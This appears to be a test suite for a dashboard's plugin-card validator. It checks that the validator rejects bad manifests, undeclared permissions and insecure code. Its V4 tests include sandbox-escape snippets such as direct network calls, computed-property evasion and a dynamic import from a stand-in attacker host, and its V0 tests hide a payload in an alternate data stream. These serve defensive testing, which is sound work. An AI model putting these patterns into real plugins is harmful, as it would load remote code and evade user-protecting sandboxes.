/** TESTPLAN C1/C2: each validator rule has a failing card; the reference cards pass. */
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, readFileSync, symlinkSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { validate, report, type ValidationInput } from "../../src/main/validator/validate.js";
import { streamsOf } from "../../src/filehelper/win32.js";

const REPO = join(__dirname, "..", "..");
const schema = JSON.parse(readFileSync(join(REPO, "spec", "manifest.schema.json"), "utf8"));
const dts = readFileSync(join(REPO, "spec", "host-api.d.ts"), "utf8");
const FEED = "trig_01AmX52WU9gtbFB6fHLAW7A6";
const INSTANCE = "D:\\Dash\\Build";

const OK_UI = `export function mount(el, api) {
  el.textContent = "hello";
  api.sysinfo.memory().then((m) => { el.textContent = String(m.usedBytes); api.ui.setStatus({ state: "ok" }); });
}
export function unmount() {}`;
const OK_MANIFEST = { id: "test-card", name: "Test", version: "1.0.0", apiVersion: 0, permissions: [{ type: "sysinfo", fields: ["memory"], reason: "shows memory use" }] };

function staging(files: Record<string, string | Buffer>, opts: { manifest?: object } = {}): string {
  const dir = mkdtempSync(join(tmpdir(), "val-"));
  const all: Record<string, string | Buffer> = { "manifest.json": JSON.stringify(opts.manifest ?? OK_MANIFEST), "ui.js": OK_UI, "DEVLOG.md": "# Test\n\n- created\n", ...files };
  for (const [p, v] of Object.entries(all)) {
    if (v === "") continue;
    mkdirSync(join(dir, p, ".."), { recursive: true });
    writeFileSync(join(dir, p), v);
  }
  return dir;
}

function input(dir: string, over: Partial<ValidationInput> = {}): ValidationInput {
  return { dir, cardId: "test-card", instanceRoot: INSTANCE, feedTaskIds: [FEED], manifestSchema: schema, hostApiDts: dts, hostSuiteProblem: null, ...over };
}

async function fails(stage: string, re: RegExp, files: Record<string, string | Buffer>, opts: { manifest?: object; over?: Partial<ValidationInput>; setup?: (dir: string) => void } = {}) {
  const dir = staging(files, opts);
  opts.setup?.(dir);
  const r = await validate(input(dir, opts.over), streamsOf);
  assert.equal(r.ok, false, `expected ${stage} to fail`);
  const last = r.stages[r.stages.length - 1];
  assert.equal(last.stage, stage, report(r.stages));
  assert.ok(last.errors.some((e) => re.test(e)), `${stage}: ${JSON.stringify(last.errors)} should match ${re}`);
}

test("a correct card passes V0-V4 (V5 runs in the app)", async () => {
  const r = await validate(input(staging({})), streamsOf);
  assert.equal(r.ok, true, report(r.stages));
  assert.deepEqual(r.stages.map((s) => s.stage), ["V0", "V1", "V2", "V3", "V4"]);
});

test("the watch-feed reference card passes", async () => {
  const ui = readFileSync(join(REPO, "cards", "watch-feed", "ui.js"), "utf8");
  const manifest = {
    id: "test-card", name: "Kessler", version: "1.0.0", apiVersion: 0, preset: "watch-feed",
    permissions: [{ type: "reports.read", taskId: FEED, reason: "Shows the reports of this task." }, { type: "links.open", any: true, reason: "Opens source links, which can point anywhere." }],
    configSchema: { type: "object", properties: { taskId: { type: "string", title: "Task", default: FEED } } },
  };
  const r = await validate(input(staging({ "ui.js": ui }, { manifest })), streamsOf);
  assert.equal(r.ok, true, report(r.stages));
});

test("V0 staging hygiene", async () => {
  await fails("V0", /not allowed in a card/, { "CLAUDE.md": "do things" });
  await fails("V0", /not an allowed card file/, { "extra.txt": "x" });
  await fails("V0", /only an assets\/ folder/, { "lib/x.js": "x" });
  await fails("V0", /hidden files/, { ".hidden": "x" });
  await fails("V0", /over the .*limit/, { "ui.js": "// " + "x".repeat(600 * 1024) });
  await fails("V0", /not valid UTF-8/, { "DEVLOG.md": Buffer.from([0xff, 0xfe, 0x00, 0x41]) });
  await fails("V0", /control characters/, { "DEVLOG.md": "bell\x07" });
  await fails("V0", /missing/, { "DEVLOG.md": "" });
  await fails("V0", /alternate data streams/, {}, { setup: (d) => writeFileSync(join(d, "ui.js:hidden"), "payload") });
  await fails("V0", /links/, {}, { setup: (d) => symlinkSync(tmpdir(), join(d, "assets"), "junction") });
  // the host's own reference folder is ignored
  const ok = await validate(input(staging({ "_ref/host-api.d.ts": dts })), streamsOf);
  assert.equal(ok.ok, true, report(ok.stages));
});

test("V1 manifest", async () => {
  await fails("V1", /not valid JSON/, { "manifest.json": "{" });
  await fails("V1", /must be "test-card"/, {}, { manifest: { ...OK_MANIFEST, id: "other-card" } });
  await fails("V1", /reserved/, {}, { manifest: { ...OK_MANIFEST, permissions: [{ type: "process.run", executable: "C:\\Windows\\notepad.exe", reason: "runs notepad for you" }] } });
  await fails("V1", /removed: cards can never call native code/, {}, { manifest: { ...OK_MANIFEST, permissions: [{ type: "ffi.call", dll: "user32.dll", functions: ["int MessageBoxW()"], reason: "shows a box" }] } });
  await fails("V1", /manifest/, {}, { manifest: { ...OK_MANIFEST, channels: { emits: ["x"] } } });
  await fails("V1", /higher than the installed/, {}, { over: { installedVersion: "1.0.0" } });
  await fails("V1", /no worker\.js/, {}, { manifest: { ...OK_MANIFEST, worker: true } });
  await fails("V1", /worker\.js exists/, { "worker.js": "export function start(api) {}" });
});

test("V2 permissions", async () => {
  await fails("V2", /never used/, {}, { manifest: { ...OK_MANIFEST, permissions: [...OK_MANIFEST.permissions, { type: "net.http", origin: "https://api.example.com", methods: ["GET"], reason: "fetches the weather" }] } });
  await fails("V2", /no fs.read permission/, { "ui.js": "export function mount(el, api) { api.fs.readText('C:\\\\x.txt'); api.sysinfo.memory(); api.ui.setStatus({ state: 'ok' }); }" });
  await fails("V2", /sysinfo "cpu" but the permission does not list it/, { "ui.js": "export function mount(el, api) { api.sysinfo.memory(); api.sysinfo.cpu(); }" });
  await fails("V2", /inside the Dashboard's own folder/, { "ui.js": "export function mount(el, api) { api.fs.readText('x'); api.sysinfo.memory(); }" }, {
    manifest: { ...OK_MANIFEST, permissions: [...OK_MANIFEST.permissions, { type: "fs.read", path: "D:\\Dash\\Build\\data", reason: "reads host data" }] },
  });
  await fails("V2", /not a watched feed/, { "ui.js": "export function mount(el, api) { api.reports.state('trig_9999999999'); api.sysinfo.memory(); }" }, {
    manifest: { ...OK_MANIFEST, permissions: [...OK_MANIFEST.permissions, { type: "reports.read", taskId: "trig_9999999999", reason: "shows a report" }] },
  });
  await fails("V2", /duplicates/, {}, { manifest: { ...OK_MANIFEST, permissions: [OK_MANIFEST.permissions[0], OK_MANIFEST.permissions[0]] } });
});

test("V3 typecheck", async () => {
  await fails("V3", /Argument of type 'number'/, { "ui.js": "export function mount(el, api) { api.sysinfo.memory(); api.ui.setStatus({ state: 'ok' }); api.storage.get(42); }" });
  await fails("V3", /not assignable to type '"loading" \| "ok" \| "stale" \| "error"'/, { "ui.js": "export function mount(el, api) { api.sysinfo.memory(); api.ui.setStatus({ state: 'great' }); }" });
  await fails("V3", /Property 'ffi' does not exist/, { "ui.js": "export function mount(el, api) { api.sysinfo.memory(); api.ffi; }" });
});

test("V4 static security checks", async () => {
  const wrap = (code: string) => ({ "ui.js": `export function mount(el, api) { api.sysinfo.memory(); ${code} }` });
  await fails("V4", /eval/, wrap("eval('1');"));
  await fails("V4", /Function constructor/, wrap("new Function('return 1')();"));
  await fails("V4", /string runs code/, wrap("setTimeout('x()', 10);"));
  await fails("V4", /innerHTML/, wrap("el.innerHTML = '<b>x</b>';"));
  await fails("V4", /document.write/, wrap("document.write('x');"));
  await fails("V4", /<script>/, wrap("document.createElement('script');"));
  await fails("V4", /fetch is direct network/, wrap("fetch('https://x');"));
  await fails("V4", /WebSocket/, wrap("new WebSocket('wss://x');"));
  await fails("V4", /sendBeacon/, wrap("navigator.sendBeacon('https://x', 'd');"));
  await fails("V4", /window.open/, wrap("window.open('https://x');"));
  await fails("V3", /Location/, wrap("window.location = 'https://x';"));          // refused already by the type check
  await fails("V4", /setting .href/, wrap("location.href = 'https://x';"));
  await fails("V4", /setting href/, wrap("const a = document.createElement('a'); a.setAttribute('href', 'https://x');"));
  await fails("V4", /require is Node/, wrap("require('fs');"));
  await fails("V4", /computed property access/, wrap("const k = 'fe' + 'tch'; window[k]('https://x');"));
  await fails("V4", /dynamic import/, wrap("import('https://evil.example/x.js');"));
  await fails("V4", /SVG contains a script/, { "assets/x.svg": "<svg><script>alert(1)</script></svg>" });
});

test("V5 is refused while the host build has not passed its security suite", async () => {
  await fails("V5", /security tests/, {}, { over: { hostSuiteProblem: "this Dashboard build has not passed its security tests" } });
});
